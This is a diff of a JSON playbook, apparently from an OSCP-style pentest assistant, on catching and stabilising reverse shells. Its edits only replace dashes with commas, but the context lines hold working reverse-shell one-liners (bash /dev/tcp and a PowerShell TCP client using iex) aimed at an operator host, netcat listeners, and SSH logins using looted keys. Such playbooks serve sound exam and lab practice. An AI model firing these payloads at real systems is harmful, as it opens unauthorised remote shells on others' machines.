@@ -1,6 +1,6 @@
 {
   "name": "Reverse shells & handlers (§3)",
-  "description": "Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator — never auto-fired, an OSCP requirement; the listener runs locally.",
+  "description": "Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator, never auto-fired, an OSCP requirement; the listener runs locally.",
   "source": "OSCP methodology (project-authored, obol-local)",
   "actions": [
     {
@@ -14,7 +14,7 @@
       "priority": 70,
       "autonomy": "approve",
       "proves": "a listener bound and ready to catch a reverse shell",
-      "does_not_prove": "a caught shell — nothing lands until a callback actually connects",
+      "does_not_prove": "a caught shell, nothing lands until a callback actually connects",
       "commands": [
         {"tool": "rlwrap", "run": "rlwrap nc -lvnp 4444"},
         {"tool": "penelope", "run": "penelope 4444"}
@@ -31,7 +31,7 @@
       "priority": 62,
       "autonomy": "manual",
       "proves": "an interactive shell on the Linux target (once caught)",
-      "does_not_prove": "privileged access — the shell arrives as the exploited service's user, nothing more",
+      "does_not_prove": "privileged access, the shell arrives as the exploited service's user, nothing more",
       "refs": ["https://www.revshells.com/"],
       "commands": [
         {"tool": "bash", "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'"},
@@ -49,7 +49,7 @@
       "priority": 60,
       "autonomy": "manual",
       "proves": "an interactive shell on the Windows target (once caught)",
-      "does_not_prove": "administrator or SYSTEM — the shell arrives as the exploited process's user",
+      "does_not_prove": "administrator or SYSTEM, the shell arrives as the exploited process's user",
       "refs": ["https://www.revshells.com/"],
       "commands": [
         {"tool": "powershell", "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""}
@@ -66,7 +66,7 @@
       "priority": 58,
       "autonomy": "manual",
       "proves": "a fully-interactive TTY on the target",
-      "does_not_prove": "any new access — it only stabilises the shell you already hold",
+      "does_not_prove": "any new access, it only stabilises the shell you already hold",
       "refs": ["https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"],
       "commands": [
         {"tool": "python3", "run": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"}
@@ -75,7 +75,7 @@
     {
       "id": "ssh-key-login",
       "title": "Log in over SSH with a recovered private key",
-      "hypothesis": "A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable — save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).",
+      "hypothesis": "A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable, save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).",
       "tool": "ssh",
       "tools": ["ssh"],
       "requires_all": ["ssh.reachable"],
@@ -94,7 +94,7 @@
     {
       "id": "linux-remote-exec",
       "title": "Authenticated Remote Command (SSH)",
-      "hypothesis": "With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session — enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.",
+      "hypothesis": "With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session, enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.",
       "tool": "sshpass",
       "tools": ["sshpass", "ssh"],
       "os": ["linux"],
@@ -109,9 +109,9 @@
       "refs": ["https://gtfobins.github.io/", "https://man.openbsd.org/ssh"],
       "commands": [
         {"tool": "sshpass", "run": "sshpass -p '{{password}}' ssh -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
-         "note": "Password auth — runs one command and returns. String several with ';' inside the quotes."},
+         "note": "Password auth, runs one command and returns. String several with ';' inside the quotes."},
         {"tool": "ssh", "run": "ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
-         "note": "Key auth — save the recovered private key to id_rsa first."}
+         "note": "Key auth, save the recovered private key to id_rsa first."}
       ]
     }
   ]
